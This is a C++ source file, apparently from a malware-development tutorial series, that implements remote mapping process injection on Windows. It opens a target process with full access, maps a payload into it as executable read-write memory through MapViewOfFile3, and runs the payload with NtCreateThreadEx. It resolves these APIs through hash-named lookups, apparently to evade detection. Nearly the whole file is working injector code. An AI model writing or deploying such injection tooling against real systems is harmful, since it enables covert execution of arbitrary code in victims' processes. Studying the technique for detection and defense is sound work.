/**
 * Author : Yekuuun
 * Github : https://github.com/Yekuuun
 * 
 * Injection chapter.
 */

#include "inject.hpp"

//-----------------DEFINITIONS-------------------------

#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );        \
    (p)->RootDirectory = r;                           \
    (p)->Attributes = a;                              \
    (p)->ObjectName = n;                              \
    (p)->SecurityDescriptor = s;                      \
    (p)->SecurityQualityOfService = NULL;             \
}
#endif

/**
 * MapViewOfFile3 definition.
 */
typedef PVOID (NTAPI *PMAPVIEWOFFILE3)(
    HANDLE  FileMapping,
    HANDLE  Process,
    ULONG64 BaseAddress,
    PVOID   Offset,
    SIZE_T  ViewSize,
    ULONG   AllocationType,
    ULONG   PageProtection,
    MEM_EXTENDED_PARAMETER *ExtendedParameters,
    ULONG   ParameterCount
);

/**
 * MapViewOfFile
 */
typedef LPVOID (NTAPI *PMAPVIEWOFFILE)(
    HANDLE hFileMappingObject,
    DWORD dwDesiredAccess,
    DWORD dwFileOffsetHigh,
    DWORD dwFileOffsetLow,
    SIZE_T dwNumberOfBytesToMap
);

/**
 * CreateFileMapping
 */
typedef HANDLE (WINAPI *PCREATEFILEMAPPING)(
    HANDLE hFile,
    PSECURITY_ATTRIBUTES lpAttributes,
    DWORD flProtect,
    DWORD dwMaximumSizeHigh,
    DWORD dwMaximumSizeLow,
    LPCSTR lpName
);

//------------------SOURCE CODE--------------------------

/**
 * Retrieve a handle to a given process.
 * @param PID  => PID of target process.
 */
HANDLE GetGivenProcessHandle(DWORD PID){
    HANDLE         hProcess       = NULL;
    PNTOPENPROCESS pNtOpenProcess = NULL;

    CLIENT_ID CID                 = { (HANDLE)PID, NULL };
    OBJECT_ATTRIBUTES OA          = { sizeof(OA),  NULL };

    pNtOpenProcess = (PNTOPENPROCESS)GetProcAddress(GetModuleHandleW(NTDLL_HASH), NTOPEN_PROCESS_HASH);
    if(pNtOpenProcess == NULL){
        printf("[!] Unable to get ptr to NtOpenProcess \n");
        return NULL;
    }

    NTSTATUS OpenProcessStatus = pNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
    if(OpenProcessStatus != STATUS_SUCCESS){
        printf("[!] Unable to to get handle to process with PID : %i \n", PID);
        return NULL;
    }

    return hProcess;
}

/**
 * Main injection function.
 * @param PID => given process ID.
 * @param pPayload => ptr to payload.
 * @param sPayloadSize => size of given payload.
 */
BOOL RemoteMappingInjection(DWORD PID, PBYTE pPayload, SIZE_T sPayloadSize){
    BOOL STATE                        = TRUE;
    HANDLE hProcess                   = NULL;
    HANDLE hFile                      = NULL;
    PVOID  pMapLocalAddress           = NULL;
    PVOID  pMapRemoteAddress          = NULL;
    HANDLE hThread                    = NULL;
    
    CLIENT_ID CID           = { (HANDLE)PID, NULL };
    OBJECT_ATTRIBUTES OA    = { sizeof(OA),  NULL };

    PNTCLOSE               pNtClose            = NULL;
    PCREATEFILEMAPPING     pCreateFileMapping  = NULL;
    PMAPVIEWOFFILE3        pMapViewOfFile3     = NULL;
    PMAPVIEWOFFILE         pMapViewOfFile      = NULL;
    PNTCREATETHREADEX      pNtCreateThreadEx   = NULL;
    PNTWAITFORSINGLEOBJECT pNtWaitObject       = NULL;

    //get functions address.
    pNtClose = (PNTCLOSE)(GetProcAddress(GetModuleHandleW(NTDLL_HASH), NTCLOSE_HASH));
    pCreateFileMapping = (PCREATEFILEMAPPING)(GetProcAddress(GetModuleHandleW(KERNEL32_HASH), CREATEFILEMAPPINGA));
    pMapViewOfFile3 = (PMAPVIEWOFFILE3)(GetProcAddress(GetModuleHandleW(KERNEL_BASE), MAPVIEWOFFILE3));
    pMapViewOfFile = (PMAPVIEWOFFILE)(GetProcAddress(GetModuleHandleW(KERNEL32_HASH), MAPVIEWOFFILE));
    pNtCreateThreadEx = (PNTCREATETHREADEX)(GetProcAddress(GetModuleHandleW(NTDLL_HASH), NTCREATETHREADEX_HASH));
    pNtWaitObject = (PNTWAITFORSINGLEOBJECT)GetProcAddress(GetModuleHandleW(NTDLL_HASH), NTWAITSINGLEOBJECT);

    if(pNtClose == NULL || pCreateFileMapping == NULL || pMapViewOfFile3 == NULL || pMapViewOfFile == NULL || pNtCreateThreadEx == NULL || pNtWaitObject == NULL){
        printf("[!] Unable to retrieve pointers to needed functions.\n");
        STATE = FALSE; goto _EndFunc;
    }

    hProcess = GetGivenProcessHandle(PID);
    if(hProcess == NULL){
        printf("[!] Unable to get handle to given process.");
    }

    printf("[*] Successfully got handle to process with PID %lu \n", PID);
    printf("[*] PRESS <ENTER> to continue.... \n");
    getchar();

    hFile = pCreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
    if(hFile == NULL){
        printf("[!] Error calling CreateFileMapping function\n");
        return FALSE;
    }

    pMapLocalAddress = pMapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, sPayloadSize);
	if (pMapLocalAddress == NULL) {
		printf("\t[!] MapViewOfFile Failed\n");
		STATE = FALSE; goto _EndFunc;
	}

    printf("[*] Local mapping address : 0x%p \n", pMapLocalAddress);
	printf("[*] Press <Enter> To Write The Payload ... \n");
	getchar();

	printf("[*] Copying payload to 0x%p ... \n", pMapLocalAddress);
	memcpy(pMapLocalAddress, pPayload, sPayloadSize);

    pMapRemoteAddress = pMapViewOfFile3(hFile, hProcess, NULL, 0, 0, 0, PAGE_EXECUTE_READWRITE, NULL, 0);
    if(pMapRemoteAddress == NULL){
        printf("[!] MapViewOfFile3 failed\n");
		STATE = FALSE; goto _EndFunc;
    }

    printf("[*] Remote mapping address : 0x%p \n", pMapRemoteAddress);

    NTSTATUS CreateThreadStatus = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, pMapRemoteAddress, NULL, FALSE,  0, 0, 0, NULL);
    if(CreateThreadStatus != STATUS_SUCCESS){
        printf("[!] Error calling NtCreateThreadEx \n");
        STATE = FALSE; goto _EndFunc;
    }

    printf("[*] Successfully inject payload into process.\n");
    NTSTATUS waitStatus = pNtWaitObject(hThread, FALSE, NULL);

_EndFunc:
    if(pNtClose != NULL){
        if(hProcess){
            NTSTATUS pNtCloseStatus = pNtClose(hProcess);
        }

        if(hFile){
            NTSTATUS pNtCloseStatus = pNtClose(hFile);
        }

        if(hThread){
            NTSTATUS pNtCloseStatus = pNtClose(hThread);
        }
    }
    
    return STATE;
}